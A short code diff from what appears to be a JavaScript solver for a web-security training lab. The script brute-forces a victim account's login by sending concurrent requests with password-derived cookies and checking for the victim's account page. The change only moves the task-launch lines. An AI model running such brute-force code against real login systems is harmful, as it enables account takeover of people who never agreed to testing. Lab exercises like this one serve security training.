@@ -11,6 +11,8 @@ const { labUrl, concurrencyLimit, httpClient } = getParsedInputFromUser({
 });
 
 const passwords = await getPasswords();
+const tasks = passwords.map((password) => () => task(password));
+runTasks(tasks, concurrencyLimit);
 
 async function task(password) {
   const resp = await httpClient.get(labUrl, {
@@ -41,6 +43,3 @@ function getCookie(password) {
 function isLoggedIn(html) {
   return html.includes(`my-account?id=${victimsAccount.username}`);
 }
-
-const tasks = passwords.map((password) => () => task(password));
-runTasks(tasks, concurrencyLimit);
